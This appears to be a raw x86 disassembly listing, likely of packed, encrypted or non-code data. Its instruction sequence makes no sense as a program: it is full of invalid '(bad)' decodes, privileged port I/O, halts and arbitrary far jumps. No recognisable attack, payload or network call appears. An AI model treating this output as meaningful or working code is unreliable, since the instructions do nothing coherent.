  41ee6e:	shl    DWORD PTR [eax+0x33e68a93],0x14
  41ee75:	xor    ecx,ebp
  41ee77:	cmp    dh,BYTE PTR [edi-0x4c]
  41ee7a:	mov    ?,WORD PTR [edx+0xb6c6c8a]
  41ee80:	dec    eax
  41ee81:	fnstenv [ebp+0x42]
  41ee84:	adc    ax,0xf8a5
  41ee88:	cmp    DWORD PTR [esi-0x4c],ebp
  41ee8b:	mov    edi,0x2edd68b7
  41ee90:	sahf   
  41ee91:	outs   dx,DWORD PTR ds:[esi]
  41ee92:	and    eax,0x8dd258a4
  41ee97:	sub    ebx,DWORD PTR [ebx-0x5b0ebedb]
  41ee9d:	(bad)  
  41ee9f:	mov    ebx,0xeaae9bc5
  41eea4:	xchg   edi,eax
  41eea5:	dec    esi
  41eea6:	call   0xdafa95f6
  41eeab:	sub    BYTE PTR [ebx+0x39148135],bl
  41eeb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeb2:	out    0x6f,al
  41eeb4:	in     al,dx
  41eeb5:	sbb    ch,dl
  41eeb7:	scas   eax,DWORD PTR es:[edi]
  41eeb8:	jle    0x41ee85
  41eeba:	mov    ah,0x25
  41eebc:	mov    DWORD PTR [edi-0x3718cb91],esp
  41eec2:	add    BYTE PTR [edi],ch
  41eec4:	dec    esp
  41eec5:	mov    al,ds:0xa92cd9d1
  41eeca:	mov    ebx,0xaa69d0f
  41eecf:	dec    BYTE PTR [edi+0x76be4be9]
  41eed5:	hlt    
  41eed6:	pop    edx
  41eed7:	aad    0x3e
  41eed9:	stos   BYTE PTR es:[edi],al
  41eeda:	pop    ebp
  41eedb:	gs (bad) 
  41eede:	popf   
  41eedf:	inc    ecx
  41eee0:	sub    al,0x93
  41eee2:	ds push ds
  41eee4:	sbb    bl,BYTE PTR [ecx+0x32]
  41eee7:	pusha  
  41eee8:	inc    esi
  41eee9:	cmc    
  41eeea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeeb:	mov    bl,0xda
  41eeed:	or     dh,BYTE PTR [eax+0x70e614a6]
  41eef3:	mov    ah,0xe2
  41eef5:	pusha  
  41eef6:	pop    ss
  41eef7:	xchg   ecx,eax
  41eef8:	push   ecx
  41eef9:	jb     0x41eef0
  41eefb:	into   
  41eefc:	dec    eax
  41eefd:	cli    
  41eefe:	push   edi
  41eeff:	sub    edi,eax
  41ef01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef02:	test   BYTE PTR [ebp-0x10b08891],dh
  41ef08:	aad    0x97
  41ef0a:	jmp    0x9d4d:0x64257597
  41ef11:	sti    
  41ef12:	push   edx
  41ef13:	add    dh,cl
  41ef15:	sar    bh,cl
  41ef17:	in     al,0xa
  41ef19:	xchg   edx,eax
  41ef1a:	arpl   WORD PTR [eax-0x51],ax
  41ef1d:	out    0x10,eax
  41ef1f:	and    cl,BYTE PTR [eax]
  41ef21:	fs aad 0xdc
  41ef24:	in     eax,0x92
  41ef26:	out    dx,eax
  41ef27:	jae    0x41ef79
  41ef29:	or     bh,ch
  41ef2b:	daa    
  41ef2c:	cmp    BYTE PTR [eax-0xf5111f6],ah
  41ef32:	test   DWORD PTR [esi-0x30],0xfe821b98
  41ef39:	mov    edi,0xbfaceebf
  41ef3e:	ins    DWORD PTR es:[edi],dx
  41ef3f:	aaa    
  41ef40:	enter  0xa278,0x79
  41ef44:	out    dx,al
  41ef45:	fstp   st(1)
  41ef47:	fisttp WORD PTR [ecx]
  41ef49:	out    0x37,eax
  41ef4b:	and    ecx,0x545643f4
  41ef51:	aad    0xfc
  41ef53:	test   eax,0xd3a7a9f4
  41ef58:	mov    ebx,0xec5b9c2d
  41ef5d:	aas    
  41ef5e:	test   BYTE PTR [edx+0x21],0xa4
  41ef62:	lods   eax,DWORD PTR ds:[esi]
  41ef63:	fucomi st,st(5)
  41ef65:	xchg   ebp,eax
  41ef66:	add    BYTE PTR [esi-0x1c],dh
  41ef69:	fucomi st,st(4)
  41ef6b:	or     BYTE PTR [ebp+0x1dd46523],0x78
  41ef72:	call   0x55ad:0x29799aa2
  41ef79:	pop    edx
  41ef7a:	mov    ss,WORD PTR ds:0xc593d3db
  41ef80:	mov    cl,0xf0
  41ef82:	xor    eax,DWORD PTR [edi-0x6b]
  41ef85:	cmp    BYTE PTR [edx-0x431f8823],al
  41ef8b:	into   
  41ef8c:	gs test eax,0x5eaddea9
  41ef92:	or     BYTE PTR [ebx+0x43],0xb9
  41ef96:	hlt    
  41ef97:	jp     0x41ef83
  41ef99:	aas    
  41ef9a:	mul    DWORD PTR [ecx]
  41ef9c:	xor    DWORD PTR [ebx],ecx
  41ef9e:	(bad)  
  41ef9f:	mov    WORD PTR [esi+0x347d302c],ss
  41efa5:	inc    eax
  41efa6:	mov    edx,0xb0228bb8
  41efab:	or     eax,0x707e9552
  41efb0:	and    bh,ch
  41efb2:	pop    es
  41efb3:	dec    esi
  41efb4:	jnp    0x41ef43
  41efb6:	aam    0xfb
  41efb8:	xchg   edx,eax
  41efb9:	inc    edi
  41efba:	(bad)  
  41efbb:	mov    ebp,0x48136df8
  41efc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efc1:	pushf  
  41efc2:	add    DWORD PTR [ebp+0x34828e0b],edi
  41efc8:	pop    ecx
  41efc9:	cli    
  41efca:	lods   al,BYTE PTR ds:[esi]
  41efcb:	sbb    DWORD PTR [ebx],0x31edb6dc
  41efd1:	adc    cl,BYTE PTR [ebx+edx*2+0x7bfcf2ce]
  41efd8:	cld    
  41efd9:	out    dx,al
  41efda:	mov    esp,0x4711ac76
  41efdf:	xchg   esp,eax
  41efe0:	jp     0x41efd9
  41efe2:	aam    0xd
  41efe4:	aam    0xcc
  41efe6:	xchg   ebx,eax
  41efe7:	mov    eax,ds:0x86ec14f1
  41efec:	push   edx
  41efed:	inc    edi
  41efee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efef:	out    dx,al
  41eff0:	inc    eax
  41eff1:	xchg   DWORD PTR [ecx+0x52],edi
  41eff4:	xor    ebx,edx
  41eff6:	ret    
  41eff7:	push   ds
  41eff8:	jg     0x41ef9d
  41effa:	xchg   edx,eax
  41effb:	jnp    0x41ef84
  41effd:	push   ebp
  41effe:	dec    esp
  41efff:	inc    edi
  41f000:	mov    ebp,0xe64e6fef
  41f005:	addr16 xchg ebx,eax
  41f007:	(bad)  
  41f008:	pop    ecx
  41f009:	ss loope 0x41efee
  41f00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f00d:	mov    al,0x15
  41f00f:	jge    0x41f082
  41f011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f012:	jne    0x41f03e
  41f014:	inc    eax
  41f015:	ret    0xfe97
  41f018:	sbb    al,0x51
  41f01a:	xor    edx,DWORD PTR [edx]
  41f01c:	lock mov eax,0xd55c210
  41f022:	popf   
  41f023:	or     DWORD PTR [edx-0x164992e2],esp
  41f029:	iret   
  41f02a:	lds    esi,FWORD PTR [eax+0x661a395b]
  41f030:	div    esp
  41f032:	mov    ds:0x39a2a724,al
  41f037:	sahf   
  41f038:	popa   
  41f039:	sub    BYTE PTR [ebx],al
  41f03b:	mov    esp,0x447e2506
  41f040:	xchg   edx,eax
  41f041:	push   ebp
  41f042:	(bad)  
  41f044:	push   ebp
  41f045:	ror    dl,cl
  41f047:	mov    cl,0x73
  41f049:	out    0xdc,eax
  41f04b:	push   ecx
  41f04c:	mov    ds:0xac76c7ef,al
  41f051:	mov    bl,0xc0
  41f053:	mov    WORD PTR [ebx-0x45],ss
  41f056:	push   es
  41f057:	dec    edi
  41f058:	repnz shl BYTE PTR [edi+0x49],cl
  41f05c:	std    
  41f05d:	test   BYTE PTR [eax-0xb736aec],0xc3
  41f064:	and    ch,ah
  41f066:	stc    
  41f067:	outs   dx,DWORD PTR ds:[esi]
  41f068:	xchg   ebx,eax
  41f069:	mov    ecx,0x482e8afa
  41f06e:	mov    ecx,0x8498193a
  41f073:	popf   
  41f074:	stos   DWORD PTR es:[edi],eax
  41f075:	push   cs
  41f076:	mov    eax,0x1615495a
  41f07b:	mov    BYTE PTR [edx],bh
  41f07d:	jge    0x41f086
  41f07f:	daa    
  41f080:	jbe    0x41f0ac
  41f082:	jbe    0x41f057
  41f084:	inc    ebx
  41f085:	in     al,dx
  41f086:	adc    bh,ah
  41f088:	or     BYTE PTR [esi+ebx*4],dh
  41f08b:	cs cmp cl,bl
  41f08e:	sahf   
  41f08f:	js     0x41f0e0
  41f091:	sbb    ch,BYTE PTR [ebp-0x29]
  41f094:	mov    ebp,0x954cd1d6
  41f099:	(bad)  
  41f09a:	data16 mov dh,0x65
  41f09d:	xor    al,0x4d
  41f09f:	nop
  41f0a0:	push   ecx
  41f0a1:	push   cs
  41f0a2:	inc    ebp
  41f0a3:	std    
  41f0a4:	xchg   BYTE PTR [esp+edx*2-0x7601a36],cl
  41f0ab:	nop
  41f0ac:	mov    esp,0x1619673f
  41f0b1:	dec    esp
  41f0b2:	int3   
  41f0b3:	lahf   
  41f0b4:	cmp    BYTE PTR [edi-0x6f4d883b],al
  41f0ba:	leave  
  41f0bb:	or     al,0x60
  41f0bd:	adc    bl,bh
  41f0bf:	add    esp,esp
  41f0c1:	cmp    al,0x4a
  41f0c3:	gs xor edx,edx
  41f0c6:	jge    0x41f09b
  41f0c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0c9:	pop    esi
  41f0ca:	hlt    
  41f0cb:	enter  0x42aa,0x28
  41f0cf:	fsubr  DWORD PTR [edi]
  41f0d1:	mov    esi,ds
  41f0d3:	pop    ebx
  41f0d4:	test   eax,0xe20fcdaf
  41f0d9:	ficomp WORD PTR [esi]
  41f0db:	xor    ah,BYTE PTR [esi]
  41f0dd:	mov    cl,0xd9
  41f0df:	dec    ebx
  41f0e0:	mov    dh,0x9d
  41f0e2:	jle    0x41f101
  41f0e4:	pop    es
  41f0e5:	shl    DWORD PTR [ecx],cl
  41f0e7:	shr    BYTE PTR [eax+0x664f765f],0xed
  41f0ee:	outs   dx,BYTE PTR ds:[esi]
  41f0ef:	lods   al,BYTE PTR ds:[esi]
  41f0f0:	pop    esi
  41f0f1:	shr    DWORD PTR [eax-0x17],cl
  41f0f4:	leave  
  41f0f5:	fdivr  DWORD PTR [ebx-0x3ca19099]
  41f0fb:	jnp    0x41f12f
  41f0fd:	and    ah,BYTE PTR [ecx+0x2d]
  41f100:	data16 adc al,0x9e
  41f103:	(bad)  
  41f104:	fsub   QWORD PTR [edi+0x68]
  41f107:	out    0x2e,al
  41f109:	xor    DWORD PTR [edi+0x1954b0bc],esi
  41f10f:	mov    cl,BYTE PTR [edi+esi*8-0x60]
  41f113:	gs repz mov al,0xb6
  41f117:	(bad)  
  41f118:	push   ebp
  41f119:	jecxz  0x41f10c
  41f11b:	test   al,0x26
  41f11d:	pop    es
  41f11e:	scas   al,BYTE PTR es:[edi]
  41f11f:	xlat   BYTE PTR ds:[ebx]
  41f120:	mov    cl,0xbd
  41f122:	mov    dl,0x21
  41f124:	xchg   esi,eax
  41f125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	aam    0x4
  41f129:	add    cl,BYTE PTR [esi]
  41f12b:	push   ebp
  41f12c:	out    dx,eax
  41f12d:	or     BYTE PTR [edi+0x66],al
  41f130:	fld    DWORD PTR [eax-0x68]
  41f133:	dec    ebp
  41f134:	xchg   esi,eax
  41f135:	lock test eax,0x8131b9be
  41f13b:	pop    edx
  41f13c:	ja     0x41f130
  41f13e:	pop    ecx
  41f13f:	das    
  41f140:	ficom  WORD PTR [esi]
  41f142:	sub    al,0xa0
  41f144:	dec    eax
  41f145:	dec    esp
  41f146:	mov    dl,0x9a
  41f148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f149:	add    al,0x43
  41f14b:	adc    BYTE PTR [edi+0x2b],dl
  41f14e:	dec    ebp
  41f14f:	or     esp,DWORD PTR [ecx+0x77038e8a]
  41f155:	xor    al,0x8a
  41f157:	xchg   esp,eax
  41f158:	sub    dl,BYTE PTR [eax]
  41f15a:	nop
  41f15b:	adc    dl,dl
  41f15d:	inc    ecx
  41f15e:	fldenv [edx]
  41f160:	inc    ebp
  41f161:	pop    edx
  41f162:	mov    WORD PTR [edx-0x93ea4b6],?
  41f168:	pop    esp
  41f169:	les    ecx,FWORD PTR [ebx]
  41f16b:	sbb    BYTE PTR [edi+0x5f414c62],0x32
  41f172:	sbb    eax,0x18e56695
  41f177:	pop    ebp
  41f178:	jp     0x41f1f0
  41f17a:	repnz fstp DWORD PTR [esi]
  41f17d:	pop    ebp
  41f17e:	jp     0x41f1c9
  41f180:	cmp    BYTE PTR [edi+0x4b],ah
  41f183:	sti    
  41f184:	mov    edi,0x78710dc8
  41f189:	cmp    BYTE PTR [edi+edi*1-0xd97b49d],ch
  41f190:	into   
  41f191:	mov    eax,0x2a6af8f9
  41f196:	jnp    0x41f179
  41f198:	xchg   esp,eax
  41f199:	lea    ebp,[esp+eiz*4]
  41f19c:	pop    ds
  41f19d:	je     0x41f1dd
  41f19f:	repz ret 0x671b
  41f1a3:	retf   
  41f1a4:	or     BYTE PTR [ebx],0xef
  41f1a7:	push   ebp
  41f1a8:	pop    ecx
  41f1a9:	adc    ch,al
  41f1ab:	scas   eax,DWORD PTR es:[edi]
  41f1ac:	das    
  41f1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1ae:	mov    dl,0x32
  41f1b0:	xchg   ecx,eax
  41f1b1:	or     BYTE PTR ds:0x50533a93,ah
  41f1b7:	iret   
  41f1b8:	jo     0x41f224
  41f1ba:	mov    ds,WORD PTR [edi+0x3d1c31f4]
  41f1c0:	loopne 0x41f1ce
  41f1c2:	sti    
  41f1c3:	aaa    
  41f1c4:	push   edi
  41f1c5:	mov    bh,0x54
  41f1c7:	jb     0x41f23a
  41f1c9:	jl     0x41f1a2
  41f1cb:	mov    dl,0x14
  41f1cd:	xor    DWORD PTR [eax+0x89ecfd7],edx
  41f1d3:	cmp    al,0xd5
  41f1d5:	(bad)  
  41f1d6:	ror    BYTE PTR [edx],1
  41f1d8:	jne    0x41f1f1
  41f1da:	xor    bh,BYTE PTR [ebx+ebp*1+0x2]
  41f1de:	jmp    0x41f17f
  41f1e0:	inc    ecx
  41f1e1:	int    0x28
  41f1e3:	lea    ebp,[ecx]
  41f1e5:	sub    eax,0x701fa092
  41f1ea:	pop    ecx
  41f1eb:	xor    edi,DWORD PTR [eax-0x3fef0b03]
  41f1f1:	sbb    edx,DWORD PTR [ecx]
  41f1f3:	sbb    eax,DWORD PTR [ecx+0x3e7080a6]
  41f1f9:	test   eax,0x82905764
  41f1fe:	sub    ebx,DWORD PTR [edi+edx*8+0x3a338d0]
  41f205:	pop    edi
  41f206:	cs cli 
  41f208:	loope  0x41f256
  41f20a:	jmp    0x2174:0xd1283410
  41f211:	push   edx
  41f212:	xchg   esi,eax
  41f213:	xchg   esi,eax
  41f214:	mov    DWORD PTR [ebp+esi*4-0x4f],ebp
  41f218:	xor    al,BYTE PTR [ebp+0x18]
  41f21b:	inc    eax
  41f21c:	pop    esi
  41f21d:	cmc    
  41f21e:	sar    ah,0xc
  41f221:	mov    WORD PTR [ebx+0x4a],fs
  41f224:	retf   
  41f225:	js     0x41f2a3
  41f227:	retf   
  41f228:	push   esi
  41f229:	es mov ebp,0x9b5c927d
  41f22f:	pop    DWORD PTR [ebx-0x950ab3a]
  41f235:	pop    ebx
  41f236:	mov    edx,0x397a5169
  41f23b:	sbb    ecx,DWORD PTR [edx]
  41f23d:	dec    esp
  41f23e:	ficom  DWORD PTR [ebp-0x54]
  41f241:	fld    DWORD PTR [ebx+eiz*1+0x119a9642]
  41f248:	icebp  
  41f249:	shl    dh,0x4
  41f24c:	jl     0x41f29b
  41f24e:	dec    ebp
  41f24f:	xchg   DWORD PTR [eax-0x2d],edi
  41f252:	mov    ch,0x34
  41f254:	sbb    DWORD PTR [esi+edi*8],esi
  41f257:	pop    ds
  41f258:	dec    eax
  41f259:	dec    ebx
  41f25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f25b:	daa    
  41f25c:	pop    edi
  41f25d:	int    0x79
  41f25f:	and    BYTE PTR [eax-0x56cbae86],ch
  41f265:	cdq    
  41f266:	int3   
  41f267:	test   eax,0xa07fb11c
  41f26c:	mov    eax,0x44096816
  41f271:	cwde   
  41f272:	xchg   esp,eax
  41f273:	call   0x6c176df9
  41f278:	inc    esp
  41f279:	mov    ecx,ebp
  41f27b:	int3   
  41f27c:	popf   
  41f27d:	(bad)  
  41f27e:	test   edi,esi
  41f280:	daa    
  41f281:	pop    es
  41f282:	push   0xfffffffd
  41f284:	cmp    DWORD PTR [ebp+eiz*8+0x2c7f172a],0xffffff87
  41f28c:	aam    0xa7
  41f28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f28f:	xchg   edi,eax
  41f290:	lds    ebp,FWORD PTR [edx+0x6f540bc1]
  41f296:	xor    eax,0xf9338a3a
  41f29b:	fst    DWORD PTR [edx]
  41f29d:	push   cs
  41f29e:	mov    ds:0x76602d74,al
  41f2a3:	(bad)  
  41f2a4:	sbb    eax,0xabbdfbdb
  41f2a9:	sub    ch,BYTE PTR [eax+ebp*4+0x3bd1812f]
  41f2b0:	cmp    DWORD PTR [eax-0x65a154e9],0xffffffa5
  41f2b7:	int3   
  41f2b8:	call   0x406a:0x8878f0f
  41f2bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2c0:	jae    0xd4473dfa
  41f2c6:	popf   
  41f2c7:	mov    ds:0xb27a69ca,eax
  41f2cc:	add    dl,BYTE PTR [ecx+0x4b05e8d]
  41f2d2:	arpl   WORD PTR [ebp+0x18],ax
  41f2d5:	pop    edx
  41f2d6:	sahf   
  41f2d7:	popf   
  41f2d8:	mov    bh,0xfc
  41f2da:	out    dx,al
  41f2db:	jb     0x41f31f
  41f2dd:	clc    
  41f2de:	mov    edx,0x11f2a1c2
  41f2e3:	idiv   BYTE PTR [ebx]
  41f2e5:	test   BYTE PTR [ecx-0x7891023d],dl
  41f2eb:	sub    al,0xca
  41f2ed:	xchg   ebx,eax
  41f2ee:	call   0x45a3:0x8bbe1ab0
  41f2f5:	pop    edi
  41f2f6:	pop    es
  41f2f7:	loope  0x41f31f
  41f2f9:	jle    0x41f2c1
  41f2fb:	in     al,0xb5
  41f2fd:	cmp    DWORD PTR fs:[ebx-0x5c],ebx
  41f301:	daa    
  41f302:	clc    
  41f303:	pop    ebx
  41f304:	or     al,0xf8
  41f306:	test   DWORD PTR [eax-0x2abfbe36],ebp
  41f30c:	leave  
  41f30d:	and    ch,bh
  41f30f:	xchg   esi,eax
  41f310:	daa    
  41f311:	lods   al,BYTE PTR ds:[esi]
  41f312:	xor    bl,BYTE PTR [ebp+0x5f39dc28]
  41f318:	mov    DWORD PTR ds:0xd61f27f6,ecx
  41f31e:	aad    0xbc
  41f320:	jl     0x41f2b2
  41f322:	pop    es
  41f323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f324:	nop
  41f325:	das    
  41f326:	adc    BYTE PTR [edx],0xda
  41f329:	mov    al,0xd1
  41f32b:	out    dx,eax
  41f32c:	sub    eax,DWORD PTR [esi+ecx*4-0x6d]
  41f330:	outs   dx,BYTE PTR ds:[esi]
  41f331:	inc    esi
  41f332:	popf   
  41f333:	inc    esp
  41f334:	push   edi
  41f335:	inc    edx
  41f336:	inc    eax
  41f337:	add    edi,DWORD PTR ds:0xbc2a6b3a
  41f33d:	je     0x41f39e
  41f33f:	or     ebp,ebx
  41f341:	xor    ah,dh
  41f343:	out    0x95,eax
  41f345:	out    dx,eax
  41f346:	dec    edx
  41f347:	jge    0x41f36d
  41f349:	xchg   esp,eax
  41f34a:	enter  0xbdf0,0x38
  41f34e:	loop   0x41f393
  41f350:	rcr    BYTE PTR [ebp-0x5c1eab0b],1
  41f356:	outs   dx,DWORD PTR ds:[esi]
  41f357:	pop    esi
  41f358:	dec    ebx
  41f359:	mov    eax,ds:0x23dc59ba
  41f35e:	out    dx,al
  41f35f:	fwait
  41f360:	(bad)  
  41f361:	mov    bl,0xbe
  41f363:	jg     0x41f3b7
  41f365:	enter  0xce3,0x5f
  41f369:	jo     0x41f3ad
  41f36b:	inc    ecx
  41f36c:	xchg   BYTE PTR [edi+0x75f59e2d],al
  41f372:	das    
  41f373:	(bad)  
  41f374:	mov    edx,esi
  41f376:	dec    ecx
  41f377:	lods   eax,DWORD PTR ds:[esi]
  41f378:	imul   ebx,DWORD PTR [edx],0x56
  41f37b:	jmp    FWORD PTR [eax]
  41f37d:	push   0x47
  41f37f:	scas   al,BYTE PTR es:[edi]
  41f380:	dec    esp
  41f381:	lds    edx,FWORD PTR [ebp+eax*2-0x5d]
  41f385:	hlt    
  41f386:	xor    DWORD PTR [ecx+edi*4],ecx
  41f389:	mov    cs,WORD PTR [ebx+0x66]
  41f38c:	mov    BYTE PTR [ecx+0x5fb023cd],al
  41f392:	mov    al,ds:0x7de65e3c
  41f397:	xchg   edi,eax
  41f398:	in     al,dx
  41f399:	stc    
  41f39a:	aas    
  41f39b:	stos   DWORD PTR es:[edi],eax
  41f39c:	dec    ebp
  41f39d:	jmp    0x1c9b5b9d
  41f3a2:	dec    edi
  41f3a3:	ret    
  41f3a4:	test   al,0xab
  41f3a6:	mov    DWORD PTR [esi+0x2710fe0c],esi
  41f3ac:	dec    ebx
  41f3ad:	popa   
  41f3ae:	pusha  
  41f3af:	pop    eax
  41f3b0:	loopne 0x41f3a2
  41f3b2:	or     dh,BYTE PTR [edx]
  41f3b4:	mov    bl,0xf3
  41f3b6:	out    dx,al
  41f3b7:	jge    0x41f42a
  41f3b9:	push   edx
  41f3ba:	popf   
  41f3bb:	sub    BYTE PTR [esi+0x6bf5a634],0xda
  41f3c2:	ror    BYTE PTR [eax+0x36],1
  41f3c5:	push   ebp
  41f3c6:	add    dl,al
  41f3c8:	mov    edi,0x5a005f08
  41f3cd:	add    ebx,edx
  41f3cf:	aas    
  41f3d0:	add    al,0x54
  41f3d2:	push   ebx
  41f3d3:	jl     0x41f44d
  41f3d5:	mov    edi,DWORD PTR [edx-0x6e664fce]
  41f3db:	cmc    
  41f3dc:	stos   BYTE PTR es:[edi],al
  41f3dd:	call   0x2cf:0xc4133a38
  41f3e4:	adc    dl,BYTE PTR [edi]
  41f3e6:	test   eax,0x6de56eaa
  41f3eb:	xor    DWORD PTR [ebp+0x51d95f9b],ebx
  41f3f1:	add    BYTE PTR [ebp+0x46875a5e],bl
  41f3f7:	mov    edi,0x321c47a8
  41f3fc:	xor    BYTE PTR [ebx-0x39],0xf0
  41f400:	mov    al,0x13
  41f402:	loope  0x41f42b
  41f404:	gs (bad) 
  41f406:	fidivr DWORD PTR [ebx-0x56988f8c]
  41f40c:	push   edx
  41f40d:	ins    DWORD PTR es:[edi],dx
  41f40e:	cmp    dl,dh
  41f410:	dec    ebx
  41f411:	lss    esi,FWORD PTR [eax-0x7db74a1b]
  41f418:	ret    0x9c99
  41f41b:	push   eax
  41f41c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f41d:	rol    dh,0x20
  41f420:	lods   eax,DWORD PTR ds:[esi]
  41f421:	test   BYTE PTR [ebx],ah
  41f423:	lods   eax,DWORD PTR ds:[esi]
  41f424:	dec    esp
  41f425:	js     0x41f430
  41f427:	sbb    DWORD PTR [ebp+0x7750ae8],0x4e
  41f42e:	std    
  41f42f:	lahf   
  41f430:	ficom  WORD PTR [edx-0x3905d33c]
  41f436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f437:	lock jo 0x41f44f
  41f43a:	jae    0x41f479
  41f43c:	popf   
  41f43d:	or     al,al
  41f43f:	lock xchg DWORD PTR [edi+0x84fb5fc],ecx
  41f446:	jae    0x41f471
  41f448:	data16 int 0xb7
  41f44b:	lods   al,BYTE PTR ds:[esi]
  41f44c:	mov    DWORD PTR [esi],0xf0d4afd3
  41f452:	fs push cs
  41f454:	hlt    
  41f455:	jno    0x41f4ca
  41f457:	in     eax,0x77
  41f459:	dec    edi
  41f45a:	mov    bl,0xeb
  41f45c:	sub    bl,al
  41f45e:	dec    esi
  41f45f:	clc    
  41f460:	xor    BYTE PTR [ebx+0x24342827],bl
  41f466:	nop
  41f467:	test   ebp,ecx
  41f469:	ss mov edi,ebp
  41f46c:	or     bh,BYTE PTR [edi]
  41f46e:	dec    ebx
  41f46f:	or     ch,cl
  41f471:	loop   0x41f450
  41f473:	mov    eax,0xb9d2bc60
  41f478:	push   eax
  41f479:	cwde   
  41f47a:	inc    edi
  41f47b:	push   ss
  41f47c:	mov    ds:0x2a680e90,eax
  41f481:	sub    eax,0xf78a7dde
  41f486:	imul   ebp,ebp,0xc
  41f489:	push   esp
  41f48a:	xor    bh,BYTE PTR [esi+0x2081c409]
  41f490:	(bad)
  41f494:	sub    bl,BYTE PTR [edi+0x77]
  41f497:	mov    ecx,ebp
  41f499:	mov    ebx,0x139dd411
  41f49e:	xor    al,BYTE PTR [edx+0x56]
  41f4a1:	and    BYTE PTR [ebx],dh
  41f4a3:	nop
  41f4a4:	mov    ecx,0x33e87773
  41f4a9:	pusha  
  41f4aa:	adc    BYTE PTR [eax],dh
  41f4ac:	outs   dx,BYTE PTR ds:[esi]
  41f4ae:	iret   
  41f4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4b0:	sub    al,0x83
  41f4b2:	add    cl,BYTE PTR [ebp-0x2210e025]
  41f4b8:	mov    edi,0x4f7ed3e5
  41f4bd:	sti    
  41f4be:	xor    DWORD PTR [eax+ebx*8-0x388d050c],edx
  41f4c5:	outs   dx,DWORD PTR ds:[esi]
  41f4c6:	rol    ecx,1
  41f4c8:	mov    ecx,0x16417957
  41f4cd:	frstor [edi+0x7d3d151a]
  41f4d3:	clc    
  41f4d4:	or     DWORD PTR [edx-0x6f],ecx
  41f4d7:	mov    DWORD PTR [ebp+0x4e],0xe17e7845
  41f4de:	sbb    cl,dh
  41f4e0:	or     edi,edx
  41f4e2:	shr    DWORD PTR [esi],1
  41f4e4:	cmp    eax,0x3314368c
  41f4e9:	cmp    DWORD PTR [edi],eax
  41f4eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4ed:	sub    eax,DWORD PTR [eax]
  41f4ef:	inc    esp
  41f4f0:	push   ds
  41f4f1:	neg    DWORD PTR [edi+0x10]
  41f4f4:	cmp    ebx,DWORD PTR [ecx-0x1c03bee3]
  41f4fa:	xchg   ebp,eax
  41f4fb:	adc    esi,DWORD PTR [esi-0xb]
  41f4fe:	cmp    al,ch
  41f500:	fsub   QWORD PTR [ebx-0x5b]
  41f503:	outs   dx,DWORD PTR ds:[esi]
  41f504:	or     DWORD PTR [ebx+0x35],esi
  41f507:	lock shl DWORD PTR [edi-0x402a1fa0],0x1f
  41f50f:	mov    eax,ds:0x7c3d129e
  41f514:	adc    BYTE PTR [edx],ah
  41f516:	and    dh,BYTE PTR [edx]
  41f518:	lea    ecx,[ebp+0x47a21388]
  41f51e:	retf   
  41f51f:	or     al,0xa0
  41f521:	sti    
  41f522:	div    BYTE PTR [eax]
  41f524:	mov    bh,0x68
  41f526:	mov    cl,BYTE PTR [esi-0x1f]
  41f529:	jge    0x41f4e1
  41f52b:	or     al,0xf2
  41f52d:	jmp    0x41f558
  41f52f:	scas   eax,DWORD PTR es:[edi]
  41f530:	jecxz  0x41f579
  41f532:	cmp    BYTE PTR [esi+0x1c],dl
  41f535:	sbb    eax,0x5e88390a
  41f53a:	push   ecx
  41f53b:	jmp    0x7dca:0xbce4f53f
  41f542:	mov    esi,0x2ac8d8c6
  41f547:	scas   eax,DWORD PTR es:[edi]
  41f548:	pop    ebp
  41f549:	test   al,0xe8
  41f54b:	and    dl,BYTE PTR [eax]
  41f54d:	imul   edi,DWORD PTR [edx+0x51],0x2a362237
  41f554:	pop    edi
  41f555:	pop    ds
  41f556:	clc    
  41f557:	or     dl,BYTE PTR [eax-0x20c4afa5]
  41f55d:	inc    esi
  41f55e:	sub    eax,0x98e3e487
  41f563:	fs push es
  41f565:	jmp    0x699c:0xcdac274f
  41f56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f56e:	ret    
  41f56f:	adc    dh,BYTE PTR [ecx+0x31203b79]
  41f575:	bound  esp,QWORD PTR es:[edx-0x4b58b5f1]
  41f57c:	dec    edi
  41f57d:	inc    ecx
  41f57e:	xor    esp,DWORD PTR [eax]
  41f580:	iret   
  41f581:	adc    BYTE PTR [ecx-0x3667afc3],0x54
  41f588:	and    edx,DWORD PTR ds:0xc127041d
  41f58e:	pop    eax
  41f58f:	or     DWORD PTR [edx+eiz*4],ebx
  41f592:	aam    0x72
  41f594:	cmp    eax,0x1f84f779
  41f599:	add    DWORD PTR [ebx-0x66],ebx
  41f59c:	dec    ecx
  41f59d:	je     0x41f561
  41f59f:	nop
  41f5a0:	int    0x54
  41f5a2:	and    cl,0x58
  41f5a5:	(bad)  
  41f5a6:	fcomi  st,st(7)
  41f5a8:	xor    DWORD PTR [ecx],ecx
  41f5aa:	out    dx,eax
  41f5ab:	les    esi,FWORD PTR [edi+0x45]
  41f5ae:	or     ch,dl
  41f5b0:	pop    esp
  41f5b1:	xchg   esi,eax
  41f5b2:	scas   al,BYTE PTR es:[edi]
  41f5b3:	add    ch,BYTE PTR [ebx+0x6d53ca92]
